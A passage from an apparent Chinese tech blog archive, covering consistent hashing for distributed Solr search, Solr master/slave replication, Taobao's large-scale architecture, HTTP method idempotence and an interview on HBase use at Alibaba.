个虚拟节点出来，因为计算机里面是01的世界，进行划分时采用2的次方数据容易分配均衡。另 2的32次方是42亿，我们就算有超大量的服务器也不可能超过42亿台吧，扩展和均衡性都保证了。 \n二、将三台机器分别取IP进行hashcode计算（这里也可以取hostname，只要能够唯一区别各个机器就可以了），然后映射到2的32次方上去。比如1号机器算出来的hashcode并且mod (2^32)为 123（这个是虚构的），2号机器算出来的值为 2300420，3号机器算出来为 90203920。这样三台机器就映射到了这个虚拟的42亿环形结构的节点上了。 \n三、将数据（1-9）也用同样的方法算出hashcode并对42亿取模将其配置到环形节点上。假设这几个节点算出来的值为 1：10，2：23564，3：57，4：6984，5：5689632，6：86546845，7：122，8：3300689，9：135468。可以看出 1、3、7小于123， 2、4、9 小于 2300420 大于 123， 5、6、8 大于 2300420 小于90203920。从数据映射到的位置开始顺时针查找，将数据保存到找到的第一个Cache节点上。如果超过2^32仍然找不到Cache节点，就会保存到第一个Cache节点上。也就是1、3、7将分配到1号机器，2、4、9将分配到2号机器，5、6、8将分配到3号机器。 \n这个时候大家可能会问，我到现在没有看见一致性hash带来任何好处，比传统的取模还增加了复杂度。现在马上来做一些关键性的处理，比如我们增加一台机器。按照原来我们需要把所有的数据重新分配到四台机器。一致性hash怎么做呢？现在4号机器加进来，他的hash值算出来取模后是12302012。 5、8 大于2300420 小于12302012 ，6 大于 12302012 小于90203920 。这样调整的只是把5、8从3号机器删除，4号机器中加入 5、6。 \n同理，删除机器怎么做呢，假设2号机器挂掉，受影响的也只是2号机器上的数据被迁移到离它节点，上图为4号机器。 \n大家应该明白一致性hash的基本原理了吧。不过这种算法还是有缺陷，比如在机器节点比较少、数据量大的时候，数据的分布可能不是很均衡，就会导致其中一台服务器的数据比其他机器多很多。为了解决这个问题，需要引入虚拟服务器节点的机制。如我们一共有只有三台机器，1、2、3。但是实际又不可能有这么多机器怎么解决呢？把 这些机器各自虚拟化出来3台机器，也就是 1a 1b 1c 2a 2b 2c 3a 3b 3c，这样就变成了9台机器。实际 1a 1b 1c 还是对应1。但是实际分布到环形节点就变成了9台机器。数据分布也就能够更分散一点。如图： \n写了这么多一致性hash，这个和分布式搜索有什么半点关系？我们现在使用solr4搭建了分布式搜索，测试了基于solrcloud的分布式平台提交20条数据居然需要几十秒，所以就废弃了solrcloud。采用自己hack solr平台，不用zookeeper做分布式一致性管理平台，自己管理数据的分发机制。既然需要自己管理数据的分发，就需要考虑到索引的创建，索引的更新。这样我们的一致性hash也就用上了。整体架构如下图： \n建立和更新需要维持机器的位置，能够根据数据的key找到对应的数据分发并更新。这里需要考虑的是如何高效、可靠的把数据建立、更新到索引里。 \n备份服务器防止建立服务器挂掉，可以根据备份服务器快速恢复。 \n读服务器主要做读写分离使用，防止写索引影响查询数据。 \n集群管理服务器管理整个集群内的服务器状态、告警。 \n整个集群随着业务增多还可以按照数据的类型划分，比如用户、微博等。每个类型按照上图架构搭建，就可以满足一般性能的分布式搜索。对于solr和分布式搜索的话题后续再聊。 \n扩展阅读： \njava的hashmap随着数据量的增加也会出现map调整的问题，必要的时候就初始化足够大的size以防止容量不足对已有数据进行重新hash计算。 \n疫苗：Java HashMap的死循环 http://coolshell.cn/articles/9606.html \n一致性哈希算法的优化—-关于如何保正在环中增加新节点时，命中率不受影响 （原拍拍同事scott）http://scottina.iteye.com/blog/650380 \n语言实现： \nhttp://weblogs.java.net/blog/2007/11/27/consistent-hashing java 版本的例子 \nhttp://blog.csdn.net/mayongzhan/archive/2009/06/25/4298834.aspx PHP 版的例子 \nhttp://www.codeproject.com/KB/recipes/lib-conhash.aspx C语言版本例子 \n发布于 3个月前， 阅读(150) | 评论(1) | 投票(0) | 收藏(21) \n原 \n分类: \n162013-101）首先在${tomcat目录}/conf/Catalina/localhost 创建两个solr的配置文件。 \n可以命名为solr.xml（主服务器配置）内容为： \n \n \n \nslaver_solr.xml (从服务器配置)内容为： \n \n \n \n可以看到两个配置所引用的后台管理是同一个目录的，但这个没关系，只要solr/home的不一样就行了，接着看主从服务器上solr/home的配置有什么不一样。主要是在solr/home/conf/solrconfig.xml上配置不一样的，其它配置可以互相拷贝。 \n主要不同的地方为如下： \n从服务器的配置 \n \n \n \nhttp://localhost:8080/solr/replication \n \n00:00:60 \n \n \n主服务器的配置 \n \n \ncommit \nstartup \nschema.xml,stopwords.txt \n \n \n大概这样的。启动 tomcat看看吧。。主服务器建立索引后，从服务器会请求将索引拷贝到从服务器中。 \n发布于 3个月前， 阅读(54) | 评论(0) | 投票(0) | 收藏(0) \n原 \n分类: \n162013-04时间过得很快，来淘宝已经两个月了，在这两个月的时间里，自己也感受颇深。下面就结合淘宝目前的一些底层技术框架以及自己的一些感触来说说如何构建一个可伸缩，高性能，高可用性的分布式互联网应用。　　一应用无状态淘宝session框架 \n俗话说，一个系统的伸缩性的好坏取决于应用的状态如何管理。为什么这么说呢?咱们试想一下，假如我们在session中保存了大量与客户端的状态信息的话，那么当保存状态信息的server宕机的时候，我们怎么办?通常来说，我们都是通过集群来解决这个问题，而通常所说的集群，不仅有负载均衡，更重要的是要有失效恢复failover,比如tomcat采用的集群节点广播复制，jboss采用的配对复制等session状态复制策略，但是集群中的状态恢复也有其缺点，那就是严重影响了系统的伸缩性，系统不能通过增加更多的机器来达到良好的水平伸缩，因为集群节点间session的通信会随着节点的增多而开销增大，因此要想做到应用本身的伸缩性，我们需要保证应用的无状态性，这样集群中的各个节点来说都是相同的，从而是的系统更好的水平伸缩。 \nOK，上面说了无状态的重要性，那么具体如何实现无状态呢?此时一个session框架就会发挥作用了。幸运的是淘宝已经具有了此类框架。淘宝的session框架采用的是client cookie实现，主要将状态保存到了cookie里面，这样就使得应用节点本身不需要保存任何状态信息，这样在系统用户变多的时候，就可以通过增加更多的应用节点来达到水平扩展的目的.但是采用客户端cookie的方式来保存状态也会遇到限制，比如每个cookie一般不能超过4K的大小，同时很多浏览器都限制一个站点最多保存20个cookie.淘宝cookie框架采用的是“多值cookie”，就是一个组合键对应多个cookie的值，这样不仅可以防止cookie数量超过20，同时还节省了cookie存储有效信息的空间，因为默认每个cookie都会有大约50个字节的元信息来描述cookie。 \n除了淘宝目前的session框架的实现方式以外，其实集中式session管理来完成，说具体点就是多个无状态的应用节点连接一个session服务器，session服务器将session保存到缓存中，session服务器后端再配有底层持久性数据源，比如数据库，文件系统等等。 \n二有效使用缓存Tair \n做互联网应用的兄弟应该都清楚，缓存对于一个互联网应用是多么的重要，从浏览器缓存，反向代理缓存，页面缓存，局部页面缓存，对象缓存等等都是缓存应用的场景。 \n一般来说缓存根据与应用程序的远近程度不同可以分为：local cache和remote cache。一般系统中要么采用local cache，要么采用remote cache,两者混合使用的话对于local cache和remote cache的数据一致性处理会变大比较麻烦. \n在大部分情况下,我们所说到的缓存都是读缓存,缓存还有另外一个类型:写缓存.对于一些读写比不高，同时对数据安全性需求不高的数据，我们可以将其缓存起来从而减少对底层数据库的访问,比如统计商品的访问次数,统计API的调用量等等,可以采用先写内存缓存然后延迟持久化到数据库，这样可以大大减少对数据库的写压力。 \nOK，我以店铺线的系统为例，在用户浏览店铺的时候，比如店铺介绍，店铺交流区页，店铺服务条款页面，店铺试衣间页面，以及店铺内搜索界面这些界面更新不是非常频繁，因此适合放到缓存中，这样可以大大减低DB的负载。另外宝贝详情页面相对也更新比较少，因此也适合放到缓存中来减低DB负载。 \n三应用拆分HSF \n首先，在说明应用拆分之前，我们先来回顾一下一个系统从小变大的过程中遇到的一些问题，通过这些问题我们会发现拆分对于构建一个大型系统是如何的重要。 \n系统刚上线初期，用户数并不多，所有的逻辑也许都是放在一个系统中的，所有逻辑跑到一个进程或者一个应用当中，这个时候因为比较用户少，系统访问量低，因此将全部的逻辑都放在一个应用未尝不可。但是，兄弟们都清楚，好景不长，随着系统用户的不断增加，系统的访问压力越来越多，同时随着系统发展，为了满足用户的需求，原有的系统需要增加新的功能进来，系统变得越来越复杂的时候，我们会发现系统变得越来越难维护，难扩展，同时系统伸缩性和可用性也会受到影响。那么这个时候我们如何解决这些问题呢?明智的办法就是拆分这也算是一种解耦，我们需要将原来的系统根据一定的标准，比如业务相关性等分为不同的子系统，不同的系统负责不同的功能，这样切分以后，我们可以对单独的子系统进行扩展和维护，从而提高系统的扩展性和可维护性，同时我们系统的水平伸缩性scale out大大的提升了，因为我们可以有针对性的对压力大的子系统进行水平扩展而不会影响到其它的子系统，而不会像拆分以前，每次系统压力变大的时候，我们都需要对整个大系统进行伸缩，而这样的成本是比较大的，另外经过切分，子系统与子系统之间的耦合减低了，当某个子系统暂时不可用的时候，整体系统还是可用的，从而整体系统的可用性也大大增强了。 \n因此一个大型的互联网应用，肯定是要经过拆分，因为只有拆分了，系统的扩展性，维护性,伸缩性，可用性才会变的更好。但是拆分也给系统带来了问题，就是子系统之间如何通信的问题，而具体的通信方式有哪些呢?一般有同步通信和异步通信，这里我们首先来说下同步通信，下面的主题“消息系统”会说到异步通信。既然需要通信，这个时候一个高性能的远程调用框架就显得非常总要啦，因此咱们淘宝也有了自己的HSF框架。 \n上面所说的都是拆分的好处，但是拆分以后必然的也会带来新的问题，除了刚才说的子系统通信问题外，最值得关注的问题就是系统之间的依赖关系，因为系统多了，系统的依赖关系就会变得复杂，此时就需要更好的去关注拆分标准，比如能否将一些有依赖的系统进行垂直化，使得这些系统的功能尽量的垂直，这也是目前淘宝正在做的系统垂直化，同时一定要注意系统之间的循环依赖，如果出现循环依赖一定要小心，因为这可能导致系统连锁启动失败。 \nOK，既然明白了拆分的重要性，我们看看随着淘宝的发展，淘宝本身是如何拆分系统的。 \n首先我们来看以下这个图：作者图片已无法打开，请见谅 \n从上面的图可以看出淘宝系统的一个演变过程，在这个演变的过程中，我们所说的拆分就出现V2.2和V3.0之间。在V2.2版本中，淘宝几乎所有的逻辑都放在Denali系统中，这样导致的问题就是系统扩展和修改非常麻烦，并且更加致命的是随着淘宝业务量的增加，如果按照V2.2的架构已经没有办法支撑以后淘宝的快速发展，因此大家决定对整个系统进行拆分，最终V3.0版本的淘宝系统架构图如下：作者图片已无法打开，请见谅 \n从上图可以看出V3.0版本的系统对整个系统进行了水平和垂直两个方向的拆分，水平方向上，按照功能分为交易，评价，用户，商品等系统，同样垂直方向上，划分为业务系统，核心业务系统以及以及基础服务，这样以来，各个系统都可以独立维护和独立的进行水平伸缩，比如交易系统可以在不影响其它系统的情况下独立的进行水平伸缩以及功能扩展。 \n从上面可以看出，一个大型系统要想变得可维护，可扩展，可伸缩，我们必须的对它进行拆分，拆分必然也带来系统之间如何通信以及系统之间依赖管理等问题，关于通信方面，淘宝目前独立开发了自己的高性能服务框架HSF，此框架主要解决了淘宝目前所有子系统之间的同步和异步通信目前HSF主要用于同步场合，FutureTask方式的调用场景还比较少。至于系统间的依赖管理，目前淘宝还做的不够好，这应该也是我们以后努力解决的问题。 \n四数据库拆分TDDL \n在前面“应用拆分”主题中，我们提到了一个大型互联网应用需要进行良好的拆分，而那里我们仅仅说了”应用级别”的拆分，其实我们的互联网应用除了应用级别的拆分以外，还有另外一个很重要的层面就是存储如何拆分的。因此这个主题主要涉及到如何对存储系统，通常就是所说的RDBMS进行拆分。 \n好了，确定了这个小节的主题之后，我们回顾一下，一个互联网应用从小变大的过程中遇到的一些问题，通过遇到的问题来引出我们拆分RDBMS的重要性。 \n系统刚开始的时候，因系统刚上线，用户不多，那个时候，所有的数据都放在了同一个数据库中，这个时候因为用户少压力小，一个数据库完全可以应付的了，但是随着运营那些哥们辛苦的呐喊和拼命的推广以后，突然有一天发现，oh,god,用户数量突然变多了起来，随之而来的就是数据库这哥们受不了，它终于在某一天大家都和惬意的时候挂掉啦。此时，咱们搞技术的哥们，就去看看究竟是啥原因，我们查了查以后，发现原来是数据库读取压力太大了，此时咱们都清楚是到了读写分离的时候，这个时候我们会配置一个server为master节点，然后配几个salve节点，这样以来通过读写分离，使得读取数据的压力分摊到了不同的salve节点上面，系统终于又恢复了正常，开始正常运行了。但是好景还是不长，有一天我们发现master这哥们撑不住了，它负载老高了，汗流浃背，随时都有翘掉的风险，这个时候就需要咱们垂直分区啦也就是所谓的分库，比如将商品信息，用户信息，交易信息分别存储到不同的数据库中，同时还可以针对商品信息的库采用master，salve模式，OK，通过分库以后，各个按照功能拆分的数据库写压力被分担到了不同的server上面，这样数据库的压力终于有恢复到正常状态。但是是不是这样，我们就可以高枕无忧了呢?NO,这个NO，不是我说的，是前辈们通过经验总结出来的，随着用户量的不断增加，你会发现系统中的某些表会变的异常庞大，比如好友关系表，店铺的参数配置表等，这个时候无论是写入还是读取这些表的数据，对数据库来说都是一个很耗费精力的事情，因此此时就需要我们进行“水平分区”了这就是俗话说的分表，或者说sharding. \nOK,上面说了一大堆，无非就是告诉大家一个事实“数据库是系统中最不容易scale out的一层”，一个大型的互联网应用必然会经过一个从单一DB server,到Master/salve,再到垂直分区分库，然后再到水平分区分表，sharding的过程，而在这个过程中，Master/salve以及垂直分区相对比较容易，应用的影响也不是很大，但是分表会引起一些棘手的问题，比如不能跨越多个分区join查询数据，如何平衡各个shards的负载等等，这个时候就需要一个通用的DAL框架来屏蔽底层数据存储对应用逻辑的影响，使得底层数据的访问对应用透明化。 \n拿淘宝目前的情况来说，淘宝目前也正在从昂贵的高端存储小型机+ORACLE切换到MYSQL,切换到MYSQL以后，势必会遇到垂直分区分库以及水平分区Sharding的问题，因此目前淘宝根据自己的业务特点也开发了自己的TDDL框架，此框架主要解决了分库分表对应用的透明化以及异构数据库之间的数据复制 \n五异步通信Notify \n在”远程调用框架”的介绍中,我们说了一个大型的系统为了扩展性和伸缩性方面的需求,肯定是要进行拆分,但是拆分了以后,子系统之间如何通信就成了我们首要的问题,在”远程调用框架”小节中,我们说了同步通信在一个大型分布式系统中的应用,那么这一小节我们就来说说异步通信.好了,既然说到了异步通信,那么”消息中间件”就要登场了,采用异步通信这其实也是关系到系统的伸缩性,以及最大化的对各个子系统进行解耦. \n说到异步通信，我们需要关注的一点是这里的异步一定是根据业务特点来的，一定是针对业务的异步，通常适合异步的场合是一些松耦合的通信场合，而对于本身业务上关联度比较大的业务系统之间，我们还是要采用同步通信比较靠谱。 \nOK,那么下一步我们说说异步能给系统带来什么样子的好处。首先我们想想，假如系统有A和B两个子系统构成，假如A和B是同步通信的话，那么要想使得系统整体伸缩性提高必须同时对A和B进行伸缩，这就影响了对整个系统进行scale out.其次，同步调用还会影响到可用性，从数学推理的角度来说，A同步调用B，如果A可用，那么B可用，逆否命题就是如果B不可用，那么A也不可用，这将大大影响到系统可用性，再次，系统之间异步通信以后可以大大提高系统的响应时间，使得每个请求的响应时间变短，从而提高用户体验，因此异步在提高了系统的伸缩性以及可用性的同时，也大大的增强了请求的响应时间当然了，请求的总体处理时间也许不会变少。 \n下面我们就以淘宝的业务来看看异步在淘宝的具体应用。交易系统会与很多其它的业务系统交互，如果在一次交易过程中采用同步调用的话，这就要求要向交易成功，必须依赖的所有系统都可用，而如果采用异步通信以后，交易系统借助于消息中间件Notify和其它的系统进行了解耦，这样以来当其它的系统不可用的时候，也不会影响到某此交易，从而提高了系统的可用性。 \n最后，关于异步方面的讨论，我可以推荐大家一些资源： \n1 . J2EE meets web2.0 \n2. Ebay架构特点HPTS 2009 \n六非结构化数据存储 TFS,NOSQL \n在一个大型的互联网应用当中，我们会发现并不是所有的数据都是结构化的，比如一些配置文件，一个用户对应的动态，以及一次交易的快照等信息，这些信息一般不适合保存到RDBMS中，它们更符合一种Key-value的结构，另外还有一类数据，数据量非常的大，但是实时性要求不高，此时这些数据也需要通过另外的一种存储方式进行存储，另外一些静态文件，比如各个商品的图片，商品描述等信息，这些信息因为比较大，放入RDBMS会引起读取性能问题，从而影响到其它的数据读取性能，因此这些信息也需要和其它信息分开存储，而一般的互联网应用系统都会选择把这些信息保存到分布式文件系统中，因此淘宝目前也开发了自己的分布式文件系统TFS，TFS目前限制了文件大小为2M，适合于一些小于2M数据的存放。 \n随着互联网发展，业界从08年下半年开始逐渐流行了一个概念就是NOSQL。我们都知道根据CAP理论，一致性，可用性和分区容错性3者不能同时满足，最多只能同时满足两个，我们传统的关系数据采用了ACID的事务策略，而ACID的事务策略更加讲究的是一种高一致性而降低了可用性的需求，但是互联网应用往往对可用性的要求要略高于一致性的需求，这个时候我们就需要避免采用数据的ACID事务策略，转而采用BASE事务策略，BASE事务策略是基本可用性，事务软状态以及最终一致性的缩写，通过BASE事务策略，我们可以通过最终一致性来提升系统的可用性，这也是目前很多NOSQL产品所采用的策略，包括facebook的cassandra,apache hbase,google bigtable等，这些产品非常适合一些非结构化的数据，比如key-value形式的数据存储，并且这些产品有个很好的优点就是水平伸缩性。目前淘宝也在研究和使用一些成熟的NOSQL产品。 \n七监控、预警系统 \n对于大型的系统来说，唯一可靠的就是系统的各个部分是不可靠。 \n因为一个大型的分布式系统中势必会涉及到各种各样的设备，比如网络交换机，普通PC机，各种型号的网卡，硬盘，内存等等，而这些东东都在数量非常多的时候，出现错误的概率也会变大，因此我们需要时时刻刻监控系统的状态，而监控也有粒度的粗细之分，粒度粗一点的话，我们需要对整个应用系统进行监控，比如目前的系统网络流量是多少，内存利用率是多少，IO，CPU的负载是多少，服务的访问压力是多少，服务的响应时间是多少等这一系列的监控，而细粒度一点的话，我们就需对比如应用中的某个功能，某个URL的访问量是多，每个页面的PV是多少，页面每天占用的带宽是多少，页面渲染时间是多少，静态资源比如图片每天占用的带宽是多少等等进行进一步细粒度的监控。因此一个监控系统就变得必不可少了。 \n前面说了一个监控系统的重要性，有了监控系统以后，更重要的是要和预警系统结合起来，比如当某个页面访问量增多的时候，系统能自动预警，某台Server的CPU和内存占用率突然变大的时候，系统也能自动预警，当并发请求丢失严重的时候，系统也能自动预警等等，这样以来通过监控系统和预警系统的结合可以使得我们能快速响应系统出现的问题，提高系统的稳定性和可用性。 \n八配置统一管理 \n一个大型的分布式应用，一般都是有很多节点构成的，如果每次一个新的节点加入都要更改其它节点的配置，或者每次删除一个节点也要更改配置的话，这样不仅不利于系统的维护和管理，同时也更加容易引入错误。另外很多时候集群中的很多系统的配置都是一样的，如果不进行统一的配置管理，就需要再所有的系统上维护一份配置，这样会造成配置的管理维护很麻烦，而通过一个统一的配置管理可以使得这些问题得到很好的解决，当有新的节点加入或者删除的时候，配置管理系统可以通知各个节点更新配置，从而达到所有节点的配置一致性，这样既方便也不会出错。（编选：中国电子商务研究中心 勇全） \n发布于 9个月前， 阅读(89) | 评论(1) | 投票(0) | 收藏(1) \n原 \n分类: \n262013-03基于HTTP协议的Web API是时下最为流行的一种分布式服务提供方式。无论是在大型互联网应用还是企业级架构中，我们都见到了越来越多的SOA或RESTful的Web API。为什么Web API如此流行呢？我认为很大程度上应归功于简单有效的HTTP协议。HTTP协议是一种分布式的面向资源的网络应用层协议，无论是服务器端提供Web服务，还是客户端消费Web服务都非常简单。再加上浏览器、Javascript、AJAX、JSON以及HTML5等技术和工具的发展，互联网应用架构设计表现出了从传统的PHP、JSP、ASP.NET等服务器端动态网页向Web API + RIA（富互联网应用）过渡的趋势。Web API专注于提供业务服务，RIA专注于用户界面和交互设计，从此两个领域的分工更加明晰。在这种趋势下，Web API设计将成为服务器端程序员的必修课。然而，正如简单的Java语言并不意味着高质量的Java程序，简单的HTTP协议也不意味着高质量的Web API。要想设计出高质量的Web API，还需要深入理解分布式系统及HTTP协议的特性。 \n幂等性定义 \n本文所要探讨的正是HTTP协议涉及到的一种重要性质：幂等性(Idempotence)。在HTTP/1.1规范中幂等性的定义是： \nMethods can also have the property of “idempotence” in that (aside from error or expiration issues) the side-effects of N > 0 identical requests is the same as for a single request. \n从定义上看，HTTP方法的幂等性是指一次和多次请求某一个资源应该具有同样的副作用。幂等性属于语义范畴，正如编译器只能帮助检查语法错误一样，HTTP规范也没有办法通过消息格式等语法手段来定义它，这可能是它不太受到重视的原因之一。但实际上，幂等性是分布式系统设计中十分重要的概念，而HTTP的分布式本质也决定了它在HTTP中具有重要地位。 \n分布式事务 vs 幂等设计 \n为什么需要幂等性呢？我们先从一个例子说起，假设有一个从账户取钱的远程API（可以是HTTP的，也可以不是），我们暂时用类函数的方式记为： \nbool withdraw(account_id, amount) \nwithdraw的语义是从account_id对应的账户中扣除amount数额的钱；如果扣除成功则返回true，账户余额减少amount；如果扣除失败则返回false，账户余额不变。值得注意的是：和本地环境相比，我们不能轻易假设分布式环境的可靠性。一种典型的情况是withdraw请求已经被服务器端正确处理，但服务器端的返回结果由于网络等原因被掉丢了，导致客户端无法得知处理结果。如果是在网页上，一些不恰当的设计可能会使用户认为上一次操作失败了，然后刷新页面，这就导致了withdraw被调用两次，账户也被多扣了一次钱。如图1所示： \n图1 \n这个问题的解决方案一是采用分布式事务，通过引入支持分布式事务的中间件来保证withdraw功能的事务性。分布式事务的优点是对于调用者很简单，复杂性都交给了中间件来管理。缺点则是一方面架构太重量级，容易被绑在特定的中间件上，不利于异构系统的集成；另一方面分布式事务虽然能保证事务的ACID性质，而但却无法提供性能和可用性的保证。 \n另一种更轻量级的解决方案是幂等设计。我们可以通过一些技巧把withdraw变成幂等的，比如： \nint create_ticket() \nbool idempotent_withdraw(ticket_id, account_id, amount) \ncreate_ticket的语义是获取一个服务器端生成的唯一的处理号ticket_id，它将用于标识后续的操作。idempotent_withdraw和withdraw的区别在于关联了一个ticket_id，一个ticket_id表示的操作至多只会被处理一次，每次调用都将返回第一次调用时的处理结果。这样，idempotent_withdraw就符合幂等性了，客户端就可以放心地多次调用。 \n基于幂等性的解决方案中一个完整的取钱流程被分解成了两个步骤：1.调用create_ticket()获取ticket_id；2.调用idempotent_withdraw(ticket_id, account_id, amount)。虽然create_ticket不是幂等的，但在这种设计下，它对系统状态的影响可以忽略，加上idempotent_withdraw是幂等的，所以任何一步由于网络等原因失败或超时，客户端都可以重试，直到获得结果。如图2所示： \n图2 \n和分布式事务相比，幂等设计的优势在于它的轻量级，容易适应异构环境，以及性能和可用性方面。在某些性能要求比较高的应用，幂等设计往往是唯一的选择。 \nHTTP的幂等性 \nHTTP协议本身是一种面向资源的应用层协议，但对HTTP协议的使用实际上存在着两种不同的方式：一种是RESTful的，它把HTTP当成应用层协议，比较忠实地遵守了HTTP协议的各种规定；另一种是SOA的，它并没有完全把HTTP当成应用层协议，而是把HTTP协议作为了传输层协议，然后在HTTP之上建立了自己的应用层协议。本文所讨论的HTTP幂等性主要针对RESTful风格的，不过正如上一节所看到的那样，幂等性并不属于特定的协议，它是分布式系统的一种特性；所以，不论是SOA还是RESTful的Web API设计都应该考虑幂等性。下面将介绍HTTP GET、DELETE、PUT、POST四种主要方法的语义和幂等性。 \nHTTP GET方法用于获取资源，不应有副作用，所以是幂等的。比如：GET http://www.bank.com/account/123456，不会改变资源的状态，不论调用一次还是N次都没有副作用。请注意，这里强调的是一次和N次具有相同的副作用，而不是每次GET的结果相同。GET http://www.news.com/latest-news这个HTTP请求可能会每次得到不同的结果，但它本身并没有产生任何副作用，因而是满足幂等性的。 \nHTTP DELETE方法用于删除资源，有副作用，但它应该满足幂等性。比如：DELETE http://www.forum.com/article/4231，调用一次和N次对系统产生的副作用是相同的，即删掉id为4231的帖子；因此，调用者可以多次调用或刷新页面而不必担心引起错误。 \n比较容易混淆的是HTTP POST和PUT。POST和PUT的区别容易被简单地误认为“POST表示创建资源，PUT表示更新资源”；而实际上，二者均可用于创建资源，更为本质的差别是在幂等性方面。在HTTP规范中对POST和PUT是这样定义的： \nThe POST method is used to request that the origin server accept the entity enclosed in the request as a new subordinate of the resource identified by the Request-URI in the Request-Line. …… If a resource has been created on the origin server, the response SHOULD be 201 (Created) and contain an entity which describes the status of the request and refers to the new resource, and a Location header. \nThe PUT method requests that the enclosed entity be stored under the supplied Request-URI. If the Request-URI refers to an already existing resource, the enclosed entity SHOULD be considered as a modified version of the one residing on the origin server. If the Request-URI does not point to an existing resource, and that URI is capable of being defined as a new resource by the requesting user agent, the origin server can create the resource with that URI. \nPOST所对应的URI并非创建的资源本身，而是资源的接收者。比如：POST http://www.forum.com/articles的语义是在http://www.forum.com/articles下创建一篇帖子，HTTP响应中应包含帖子的创建状态以及帖子的URI。两次相同的POST请求会在服务器端创建两份资源，它们具有不同的URI；所以，POST方法不具备幂等性。而PUT所对应的URI是要创建或更新的资源本身。比如：PUT http://www.forum/articles/4231的语义是创建或更新ID为4231的帖子。对同一URI进行多次PUT的副作用和一次PUT是相同的；因此，PUT方法具有幂等性。 \n在介绍了几种操作的语义和幂等性之后，我们来看看如何通过Web API的形式实现前面所提到的取款功能。很简单，用POST /tickets来实现create_ticket；用PUT /accounts/account_id/ticket_id&amount=xxx来实现idempotent_withdraw。值得注意的是严格来讲amount参数不应该作为URI的一部分，真正的URI应该是/accounts/account_id/ticket_id，而amount应该放在请求的body中。这种模式可以应用于很多场合，比如：论坛网站中防止意外的重复发帖。 \n总结 \n上面简单介绍了幂等性的概念，用幂等设计取代分布式事务的方法，以及HTTP主要方法的语义和幂等性特征。其实，如果要追根溯源，幂等性是数学中的一个概念，表达的是N次变换与1次变换的结果相同，有兴趣的读者可以从上进一步了解。 \n参考 \n发布于 9个月前， 阅读(9) | 评论(0) | 投票(0) | 收藏(0) \n原 \n分类: \n292012-11摘要：HBTC 2012(Hadoop&BigData Technology Conference 2012）即将召开，为了让读者可以提前了解一下目前国内各个公司在Hadoop和大数据方面的运用，CSDN于会前对演讲嘉宾进行了采访。本期采访了阿里巴巴的代志远，他给我们提前分享了一下HBase在阿里巴巴海量数据部门的实践。 \n【CSDN报道】代志远早年就职网易研究院从事MapReduce与DFS系统的自主研发，后加入支付宝数据平台负责Hadoop与HBase体系的架构设计与二次研发，支付宝流计算与分布式搜索系统的设计和研发，后成为支付宝海量计算体系架构师兼支付宝三代架构成员。现就转战于阿里巴巴集团-CDO-海量数据部门，负责创新性项目的研究和跟进，目前专注于Google第二代数据库产品MegaStore的研究和在阿里的落地。 \n在即将召开的HBTC大会中，我们有幸邀请到代志远作为我们的演讲嘉宾，请他分享下阿里巴巴在海量数据分布式数据库领域的探索。我们也对他提前做了邮件采访，让用户可以更快地了解阿里巴巴海量数据分布式数据库以及在Hadoop应用领域的实践。\n\n阿里巴巴海量数据部门: 代志远 \nCSDN: Hadoop目前是大数据处理领域的王者，你认为中小企业应用Hadoop的瓶颈在哪里？ \n代志远：首先因为Hadoop本身机制复杂，所依赖的参数配置颇多，并且Hadoop需要像数据库一样稳定，满足性能的运行，就需要运维人员如同DBA一样要懂网络、磁盘、内核以及其他一些硬件知识，这对于运维人员的要求是比较高的。其次Hadoop社区蓬勃发展，生态圈不断扩大，用户不断增多，规模极限也不断突破，这就促使了Hadoop的架构和代码发展非常快而且变更也比较快，正因为如此，系统在快速发展的时候容易引入很多的Bug和一些缺陷（可能因为稍稍的使用不当或比较小的问题就引起整体性能和稳定性的波动）。更重要的是，Hadoop代码复杂，而且需要与社区接轨，能够找到对Hadoop源码熟悉并能优化升级和bugfix的人才是很难的，这对于一个公司的研发来说是个很大的挑战。最后一点是公司的认知，除了类似Cloudera、MapR之类的软件公司需要对软件技术负责，其他多数公司无论大中小都依赖于公司业务，尤其中小公司业务压力大、人员紧张，能够从业务研发人员中抽调或通过其他方式组建专有的Hadoop运维团队甚至是研发团队，从公司规划与发展上来说是比较困难的事情。 \nCSDN: Hadoop的本质是为全量而生，就是说它重吞吐量，响应时间完全没有保障，那么对于像淘宝、天猫在“双11”活动抢购的时候，需要实时处理数据（可能是毫秒级，秒级的响应），是如何进行实现的？ \n代志远：Hadoop是离线计算平台，其中包括分布式文件系统（HDFS）和分布式计算（MapReduce），这本身是无法对响应时间做保证的。但是目前在Hadoop之上的生态系统越来越完善，其中HBase就是支持海量数据、高并发的在线数据库，应对这种场景就非常适合。HBase在这次双十一中与MySQL等在线数据库共同作为线上库使用，承担了重要的责任，并创下了并在全天高压力之下无故障的佳绩。另外非Hadoop生态圈的流式计算框架Storm、S4也同样可以为实时计算分担一定的压力。 \nCSDN: 你在云计算大会时做的一场有关HBase的报告，主要讲如何用HBase替代MySQL，HBase对比MySQL的优势在哪里？ \n代志远：准确来说是HBase替换MySQL的一部分应用，这些应用自然是要符合HBase的应用场景（与MySQL对比），比如数据量大、对线性拓展有需求、对自动化运维（负载均衡）有要求而且应用模式简单。在支付宝中因其增长速度快，业务量大，造成了很多应用都是数据量庞大而且速度增长快，因此有一些应用迫切需要一个数据库能够支撑现在的业务而降低对关系型的需求，所以尝试了HBase的解决方案。 \nCSDN: 阿里巴巴在部署Hadoop的过程中有哪些比较好的经验可以跟技术人员分享？ \n代志远：最重要的是要有一个完善团队，健全的流程。 \n集群越来越大，要树立以集群稳定性和性能为要领的工作思路。 \n现在进入Hadoop应用开发领域的人变多，但本身知识因其入行早晚而积累不同，无法对集群的稳定性负责，常常会写出跑死集群的任务（数据库中SQL使用不善也常会如此）。因此要有一个较好的管理流程约束开发人员做到责任分明，以便促使应用开发不仅要对自己的任务负责还要对集群负责，不断学习和检查减少故障的产生。 \n要有一个好的运维团队，懂硬件、重流程、负责任。 \n公司在资源和战略上应有所倾斜，重视研发人员加强在研发的投入，毕竟分布式系统的入行门槛相比应用开发的技术门槛要高，当然有好的应用架构师能够取长补短规避大多数问题也是可行的，但单一系统的稳定性还是需要靠人来保证。 \nCSDN: 请您简要介绍一下本次HBTC2012大会上的议题的内容。 \n代志远：06年Google发表论文Bigtable，社区随之出现HBase，后Google 08年发表第二代数据库产品MegaStore至今未有社区同类产品出现，现今Google又出现新一代数据库理论Spanner和F1。 而最近几年随之Bigtable和NoSQL的兴起，社区产品HBase逐步走向NoSQL系统的主流产品，优势明显然而缺点也明显，大数据平台下的业务由SQL向NoSQL的迁移比较复杂而应用人员学习成本颇高，并且无法支持事务和多维索引，使得许多业务无法享用来自NoSQL系统中线性拓展能力。 